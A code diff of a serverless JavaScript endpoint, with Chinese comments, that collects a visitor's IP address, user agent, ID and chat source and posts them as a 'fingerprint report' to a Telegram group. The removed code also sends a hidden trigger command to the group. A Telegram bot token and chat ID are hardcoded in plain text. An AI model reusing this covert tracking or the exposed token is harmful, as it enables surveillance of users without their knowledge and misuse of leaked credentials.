@@ -1,38 +1,37 @@
-// api/collect.js
 export default async function handler(req, res) {
-    const { id, ua, screen, chat } = req.query;
-    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    try {
+        // 1. 获取参数
+        const { id, ua, chat } = req.query;
+        const ip = req.headers['x-forwarded-for'] || "未知IP";
 
-    //const BOT_TOKEN = "你的机器人TOKEN"; // 填入你的机器人Token
-    //const REPORT_CHAT = "-1003659768706"; // 1280报告群ID
+        // 2. 这里的变量名我统一了，不要乱改名字哦
+        const MY_TOKEN = '8790086518:AAF103Mo8Uk_UYVdURZrZFh1Zjc2wpPV4hU'; 
+        const MY_CHAT = '-1003659768706'; 
 
+        const content = `🚨 指纹上报\nID: ${id}\nIP: ${ip}\n设备: ${ua}\n来源: ${chat}`;
 
-    const BOT_TOKEN = '8790086518:AAF103Mo8Uk_UYVdURZrZFh1Zjc2wpPV4hU'; 
-    const CHAT_ID = '-1003659768706' // 别忘了前面的负号，如 -100xxxxxxxx
-    // ------------------------------------
-    
-    // 1. 发送情报到报告群 (Topic 5)
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            chat_id: REPORT_CHAT,
-            message_thread_id: 5,
-            text: `🚨 #抓获指纹\n👤 ID: \`${id}\`\n🌐 IP: \`${ip}\`\n📱 设备: \`${ua}\`\n📍 来源: ${chat}`,
-            parse_mode: 'Markdown'
-        })
-    });
+        // 3. 关键点：加了 await 确保等电报的结果
+        const tg_res = await fetch(`https://api.telegram.org/bot${MY_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: MY_CHAT,
+                text: content
+                // 这里暂时不加 Markdown，防止符号冲突报错
+            })
+        });
 
-    // 2. 【核心】让机器人去大群解禁并欢迎 (这里我们发个指令给机器人)
-    // 技巧：我们直接通过Bot API给大群发一个隐藏的指令，或者调用你的解禁逻辑
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            chat_id: chat,
-            text: `/active_user ${id}` // 这是一个触发暗号
-        })
-    });
+        const result = await tg_res.json();
 
-    res.status(200).send("ok");
+        // 4. 根据电报的真实反馈回传给浏览器
+        if (result.ok) {
+            return res.status(200).json({ status: "SUCCESS", info: "情报已送达群" });
+        } else {
+            return res.status(200).json({ status: "TG_ERROR", detail: result.description });
+        }
+
+    } catch (error) {
+        // 捕获所有代码错误，防止 500 报错页面
+        return res.status(200).json({ status: "CODE_ERROR", message: error.message });
+    }
 }
